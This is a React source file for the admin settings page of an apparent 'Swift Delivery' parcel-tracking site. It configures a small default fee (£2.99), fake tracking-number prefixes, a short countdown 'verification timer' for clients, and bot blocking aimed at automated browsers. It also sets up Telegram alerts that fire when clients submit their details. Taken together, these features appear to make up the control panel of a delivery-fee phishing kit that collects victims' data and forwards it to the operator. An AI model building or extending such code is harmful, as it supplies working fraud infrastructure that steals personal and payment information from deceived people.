import { useState, useEffect } from "react";
import { supabase } from "@/integrations/supabase/client";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
import { toast } from "@/hooks/use-toast";
import { Save, Send, Eye, EyeOff, MessageCircle, Timer, Package, Shield, AlertTriangle, Key } from "lucide-react";
import { Slider } from "@/components/ui/slider";
import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group";

const AdminSettings = () => {
  const [botToken, setBotToken] = useState("");
  const [chatId, setChatId] = useState("");
  const [timerMinutes, setTimerMinutes] = useState(5);
  const [loading, setLoading] = useState(true);
  const [saving, setSaving] = useState(false);
  const [testing, setTesting] = useState(false);
  const [showToken, setShowToken] = useState(false);
  const [authError, setAuthError] = useState(false);

  // Default parcel settings
  const [defaultAmount, setDefaultAmount] = useState("2.99");
  const [defaultOrigin, setDefaultOrigin] = useState("Los Angeles, CA");
  const [defaultEstDelivery, setDefaultEstDelivery] = useState("2-3 Business Days");
  const [trackingPrefix, setTrackingPrefix] = useState("SWIFT");

  // Bot protection setting
  const [botProtection, setBotProtection] = useState<"aggressive" | "lite" | "off">("lite");

  // Password change
  const [currentPassword, setCurrentPassword] = useState("");
  const [newPassword, setNewPassword] = useState("");
  const [confirmPassword, setConfirmPassword] = useState("");
  const [changingPassword, setChangingPassword] = useState(false);
  const [showCurrentPassword, setShowCurrentPassword] = useState(false);
  const [showNewPassword, setShowNewPassword] = useState(false);

  // Get admin token from session storage
  const getAdminToken = () => {
    return sessionStorage.getItem("admin_token");
  };

  useEffect(() => {
    fetchSettings();
  }, []);

  const fetchSettings = async () => {
    const token = getAdminToken();
    if (!token) {
      setAuthError(true);
      setLoading(false);
      return;
    }

    try {
      const { data, error } = await supabase.functions.invoke("admin-settings", {
        headers: {
          Authorization: `Bearer ${token}`,
        },
        body: { action: "get" },
      });

      if (error || !data?.success) {
        console.error("Error fetching settings:", error || data?.error);
        setAuthError(true);
        toast({
          title: "Error",
          description: "Failed to load settings. Please re-login.",
          variant: "destructive",
        });
      } else if (data?.data) {
        const settings = data.data;
        const token = settings.find((s: { setting_key: string }) => s.setting_key === "telegram_bot_token")?.setting_value || "";
        const chat = settings.find((s: { setting_key: string }) => s.setting_key === "telegram_chat_id")?.setting_value || "";
        const timeout = settings.find((s: { setting_key: string }) => s.setting_key === "verification_timeout")?.setting_value;
        const amount = settings.find((s: { setting_key: string }) => s.setting_key === "default_amount")?.setting_value;
        const origin = settings.find((s: { setting_key: string }) => s.setting_key === "default_origin")?.setting_value;
        const estDelivery = settings.find((s: { setting_key: string }) => s.setting_key === "default_est_delivery")?.setting_value;
        const prefix = settings.find((s: { setting_key: string }) => s.setting_key === "tracking_prefix")?.setting_value;
        const botProt = settings.find((s: { setting_key: string }) => s.setting_key === "bot_protection")?.setting_value;
        
        setBotToken(token);
        setChatId(chat);
        if (timeout) setTimerMinutes(Math.round(parseInt(timeout, 10) / 60));
        if (amount) setDefaultAmount(amount);
        if (origin) setDefaultOrigin(origin);
        if (estDelivery) setDefaultEstDelivery(estDelivery);
        if (prefix) setTrackingPrefix(prefix);
        if (botProt && ["aggressive", "lite", "off"].includes(botProt)) {
          setBotProtection(botProt as "aggressive" | "lite" | "off");
        }
      }
    } catch (error) {
      console.error("Error fetching settings:", error);
      setAuthError(true);
    }
    setLoading(false);
  };

  const saveSettings = async () => {
    const token = getAdminToken();
    if (!token) {
      setAuthError(true);
      return;
    }

    setSaving(true);

    try {
      const settings: Record<string, string> = {
        telegram_bot_token: botToken,
        telegram_chat_id: chatId,
        verification_timeout: (timerMinutes * 60).toString(),
        default_amount: defaultAmount,
        default_origin: defaultOrigin,
        default_est_delivery: defaultEstDelivery,
        tracking_prefix: trackingPrefix,
        bot_protection: botProtection,
      };

      const { data, error } = await supabase.functions.invoke("admin-settings", {
        headers: {
          Authorization: `Bearer ${token}`,
        },
        body: { action: "update", settings },
      });

      if (error || !data?.success) {
        throw new Error(data?.error || "Failed to save settings");
      }

      toast({
        title: "Settings Saved",
        description: "All settings have been updated successfully",
      });
    } catch (error) {
      console.error("Error saving settings:", error);
      toast({
        title: "Error",
        description: "Failed to save settings",
        variant: "destructive",
      });
    } finally {
      setSaving(false);
    }
  };

  const testTelegram = async () => {
    if (!botToken || !chatId) {
      toast({
        title: "Missing Settings",
        description: "Please enter bot token and chat ID first",
        variant: "destructive",
      });
      return;
    }

    setTesting(true);

    try {
      const token = getAdminToken();
      const { data, error } = await supabase.functions.invoke("send-telegram", {
        headers: token ? { Authorization: `Bearer ${token}` } : {},
        body: {
          message: "🧪 <b>Test Notification</b>\n\nThis is a test message from your Swift Delivery Admin Panel. If you received this, your Telegram integration is working correctly!",
        },
      });

      if (error) throw error;

      if (data?.success) {
        toast({
          title: "Test Successful",
          description: "Check your Telegram for the test message",
        });
      } else {
        toast({
          title: "Test Failed",
          description: data?.reason || "Failed to send test message",
          variant: "destructive",
        });
      }
    } catch (error) {
      console.error("Error testing Telegram:", error);
      toast({
        title: "Error",
        description: "Failed to send test message",
        variant: "destructive",
      });
    } finally {
      setTesting(false);
    }
  };

  const changePassword = async () => {
    if (!currentPassword || !newPassword || !confirmPassword) {
      toast({
        title: "Missing Fields",
        description: "Please fill in all password fields",
        variant: "destructive",
      });
      return;
    }

    if (newPassword !== confirmPassword) {
      toast({
        title: "Passwords Don't Match",
        description: "New password and confirmation must match",
        variant: "destructive",
      });
      return;
    }

    if (newPassword.length < 8) {
      toast({
        title: "Password Too Short",
        description: "New password must be at least 8 characters",
        variant: "destructive",
      });
      return;
    }

    const token = getAdminToken();
    if (!token) {
      setAuthError(true);
      return;
    }

    setChangingPassword(true);

    try {
      const { data, error } = await supabase.functions.invoke("admin-change-password", {
        headers: {
          Authorization: `Bearer ${token}`,
        },
        body: { currentPassword, newPassword },
      });

      if (error || !data?.success) {
        throw new Error(data?.error || "Failed to change password");
      }

      toast({
        title: "Password Changed",
        description: "Your admin password has been updated successfully",
      });

      // Clear password fields
      setCurrentPassword("");
      setNewPassword("");
      setConfirmPassword("");
    } catch (error) {
      console.error("Error changing password:", error);
      toast({
        title: "Error",
        description: error instanceof Error ? error.message : "Failed to change password",
        variant: "destructive",
      });
    } finally {
      setChangingPassword(false);
    }
  };

  if (authError) {
    return (
      <Card className="max-w-md mx-auto">
        <CardHeader className="text-center">
          <div className="mx-auto w-12 h-12 bg-destructive/10 rounded-full flex items-center justify-center mb-2">
            <AlertTriangle className="w-6 h-6 text-destructive" />
          </div>
          <CardTitle>Authentication Required</CardTitle>
          <CardDescription>
            Please log in as admin to access settings. Your session may have expired.
          </CardDescription>
        </CardHeader>
      </Card>
    );
  }

  if (loading) {
    return (
      <div className="flex items-center justify-center py-10">
        <p className="text-muted-foreground">Loading settings...</p>
      </div>
    );
  }

  return (
    <div className="space-y-6">
      {/* Bot Protection Settings */}
      <Card>
        <CardHeader>
          <CardTitle className="flex items-center gap-2">
            <Shield className="w-5 h-5" />
            Bot Protection
          </CardTitle>
          <CardDescription>
            Control how aggressively the system blocks automated browsers and bots
          </CardDescription>
        </CardHeader>
        <CardContent className="space-y-4">
          <RadioGroup
            value={botProtection}
            onValueChange={(value) => setBotProtection(value as "aggressive" | "lite" | "off")}
            className="space-y-3"
          >
            <div className="flex items-start space-x-3 p-3 rounded-lg border border-destructive/30 bg-destructive/5">
              <RadioGroupItem value="aggressive" id="aggressive" className="mt-1" />
              <div className="space-y-1">
                <Label htmlFor="aggressive" className="font-medium text-destructive cursor-pointer">
                  🔒 Aggressive
                </Label>
                <p className="text-xs text-muted-foreground">
                  Blocks headless browsers, webdriver, automation tools, and suspicious user agents. May block some legitimate users on unusual browsers.
                </p>
              </div>
            </div>
            
            <div className="flex items-start space-x-3 p-3 rounded-lg border border-primary/30 bg-primary/5">
              <RadioGroupItem value="lite" id="lite" className="mt-1" />
              <div className="space-y-1">
                <Label htmlFor="lite" className="font-medium text-primary cursor-pointer">
                  ⚡ Lite (Recommended)
                </Label>
                <p className="text-xs text-muted-foreground">
                  Only blocks obvious automation tools like PhantomJS, Selenium, and Puppeteer. Safe for all regular browsers.
                </p>
              </div>
            </div>
            
            <div className="flex items-start space-x-3 p-3 rounded-lg border border-muted bg-muted/30">
              <RadioGroupItem value="off" id="off" className="mt-1" />
              <div className="space-y-1">
                <Label htmlFor="off" className="font-medium cursor-pointer">
                  ❌ Off
                </Label>
                <p className="text-xs text-muted-foreground">
                  No client-side bot detection. Relies only on robots.txt and meta tags. Use if users report access issues.
                </p>
              </div>
            </div>
          </RadioGroup>
        </CardContent>
      </Card>

      {/* Change Password */}
      <Card>
        <CardHeader>
          <CardTitle className="flex items-center gap-2">
            <Key className="w-5 h-5" />
            Change Admin Password
          </CardTitle>
          <CardDescription>
            Update your admin login password
          </CardDescription>
        </CardHeader>
        <CardContent className="space-y-4">
          <div className="space-y-2">
            <Label htmlFor="currentPassword">Current Password</Label>
            <div className="flex gap-2">
              <div className="relative flex-1">
                <Input
                  id="currentPassword"
                  type={showCurrentPassword ? "text" : "password"}
                  placeholder="Enter current password"
                  value={currentPassword}
                  onChange={(e) => setCurrentPassword(e.target.value)}
                />
              </div>
              <Button
                variant="outline"
                size="icon"
                onClick={() => setShowCurrentPassword(!showCurrentPassword)}
                type="button"
              >
                {showCurrentPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
              </Button>
            </div>
          </div>

          <div className="space-y-2">
            <Label htmlFor="newPassword">New Password</Label>
            <div className="flex gap-2">
              <div className="relative flex-1">
                <Input
                  id="newPassword"
                  type={showNewPassword ? "text" : "password"}
                  placeholder="Enter new password (min 8 characters)"
                  value={newPassword}
                  onChange={(e) => setNewPassword(e.target.value)}
                />
              </div>
              <Button
                variant="outline"
                size="icon"
                onClick={() => setShowNewPassword(!showNewPassword)}
                type="button"
              >
                {showNewPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
              </Button>
            </div>
          </div>

          <div className="space-y-2">
            <Label htmlFor="confirmPassword">Confirm New Password</Label>
            <Input
              id="confirmPassword"
              type="password"
              placeholder="Confirm new password"
              value={confirmPassword}
              onChange={(e) => setConfirmPassword(e.target.value)}
            />
          </div>

          <Button 
            onClick={changePassword} 
            disabled={changingPassword || !currentPassword || !newPassword || !confirmPassword}
            variant="outline"
            className="w-full gap-2"
          >
            <Key className="w-4 h-4" />
            {changingPassword ? "Changing Password..." : "Change Password"}
          </Button>
        </CardContent>
      </Card>

      {/* Timer Settings */}
      <Card>
        <CardHeader>
          <CardTitle className="flex items-center gap-2">
            <Timer className="w-5 h-5" />
            Verification Timer
          </CardTitle>
          <CardDescription>
            Set how long clients have to complete their verification before the timer expires
          </CardDescription>
        </CardHeader>
        <CardContent className="space-y-4">
          <div className="space-y-4">
            <div className="flex items-center justify-between">
              <Label>Timeout Duration</Label>
              <span className="text-2xl font-mono font-bold text-primary">
                {timerMinutes} min
              </span>
            </div>
            <Slider
              value={[timerMinutes]}
              onValueChange={(value) => setTimerMinutes(value[0])}
              min={1}
              max={5}
              step={1}
              className="w-full"
            />
            <div className="flex justify-between text-xs text-muted-foreground">
              <span>1 min</span>
              <span>2 min</span>
              <span>3 min</span>
              <span>4 min</span>
              <span>5 min</span>
            </div>
          </div>
        </CardContent>
      </Card>

      {/* Default Parcel Settings */}
      <Card>
        <CardHeader>
          <CardTitle className="flex items-center gap-2">
            <Package className="w-5 h-5" />
            Default Parcel Settings
          </CardTitle>
          <CardDescription>
            Set default values for new client sessions
          </CardDescription>
        </CardHeader>
        <CardContent className="space-y-4">
          <div className="grid grid-cols-2 gap-4">
            <div className="space-y-2">
              <Label htmlFor="trackingPrefix">Tracking Prefix</Label>
              <Input
                id="trackingPrefix"
                placeholder="SWIFT"
                value={trackingPrefix}
                onChange={(e) => setTrackingPrefix(e.target.value.toUpperCase())}
              />
              <p className="text-xs text-muted-foreground">
                Prefix for tracking numbers (e.g., SWIFT → SWIFTabc123)
              </p>
            </div>
            <div className="space-y-2">
              <Label htmlFor="defaultAmount">Default Amount (£)</Label>
              <Input
                id="defaultAmount"
                type="number"
                step="0.01"
                placeholder="2.99"
                value={defaultAmount}
                onChange={(e) => setDefaultAmount(e.target.value)}
              />
            </div>
          </div>

          <div className="space-y-2">
            <Label htmlFor="defaultOrigin">Default Origin</Label>
            <Input
              id="defaultOrigin"
              placeholder="Los Angeles, CA"
              value={defaultOrigin}
              onChange={(e) => setDefaultOrigin(e.target.value)}
            />
          </div>

          <div className="space-y-2">
            <Label htmlFor="defaultEstDelivery">Default Est. Delivery</Label>
            <Input
              id="defaultEstDelivery"
              placeholder="2-3 Business Days"
              value={defaultEstDelivery}
              onChange={(e) => setDefaultEstDelivery(e.target.value)}
            />
          </div>
        </CardContent>
      </Card>
      {/* Telegram Settings */}
      <Card>
        <CardHeader>
          <CardTitle className="flex items-center gap-2">
            <MessageCircle className="w-5 h-5" />
            Telegram Notifications
          </CardTitle>
          <CardDescription>
            Configure Telegram bot to receive notifications when clients submit their details
          </CardDescription>
        </CardHeader>
        <CardContent className="space-y-4">
          <div className="space-y-2">
            <Label htmlFor="botToken">Bot Token</Label>
            <div className="flex gap-2">
              <div className="relative flex-1">
                <Input
                  id="botToken"
                  type={showToken ? "text" : "password"}
                  placeholder="Enter your Telegram bot token"
                  value={botToken}
                  onChange={(e) => setBotToken(e.target.value)}
                />
              </div>
              <Button
                variant="outline"
                size="icon"
                onClick={() => setShowToken(!showToken)}
                type="button"
              >
                {showToken ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
              </Button>
            </div>
            <p className="text-xs text-muted-foreground">
              Create a bot via @BotFather on Telegram to get your token
            </p>
          </div>

          <div className="space-y-2">
            <Label htmlFor="chatId">Chat ID</Label>
            <Input
              id="chatId"
              type="text"
              placeholder="Enter your Telegram chat ID"
              value={chatId}
              onChange={(e) => setChatId(e.target.value)}
            />
            <p className="text-xs text-muted-foreground">
              Send /start to @userinfobot on Telegram to get your chat ID
            </p>
          </div>

          <div className="flex gap-2 pt-4">
            <Button 
              variant="outline" 
              onClick={testTelegram} 
              disabled={testing || !botToken || !chatId}
              className="gap-2"
            >
              <Send className="w-4 h-4" />
              {testing ? "Sending..." : "Test Notification"}
            </Button>
          </div>
        </CardContent>
      </Card>

      {/* Save Button */}
      <Button onClick={saveSettings} disabled={saving} className="w-full gap-2" size="lg">
        <Save className="w-4 h-4" />
        {saving ? "Saving..." : "Save All Settings"}
      </Button>
    </div>
  );
};

export default AdminSettings;